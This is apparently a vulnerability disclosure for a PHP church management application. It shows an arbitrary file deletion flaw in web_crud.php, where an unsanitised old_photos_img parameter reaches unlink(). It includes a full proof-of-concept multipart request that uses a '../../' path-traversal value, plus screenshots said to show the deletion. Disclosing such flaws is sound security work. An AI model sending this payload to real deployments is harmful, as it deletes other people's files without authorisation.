### Vulnerability file address

In line 91 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photos_img']);`,` $_POST['old_photos_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['photos']['tmp_name'] != '') {
            $img1 = generateUniqueFilename($_FILES['photos']);
            $filepath = "../../assets/images/" . $img1;

            if (move_uploaded_file($_FILES["photos"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photos_img']);
            }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 372

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photos_img"

../../2.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photos";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `2.txt` file in the `church/` directory

![image-20250504204335132](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042043173.png)

Then we execute the above poc to attack

![image-20250504204402255](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042044284.png)



Files are deleted after the attack is successful

![image-20250504204421248](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042044280.png)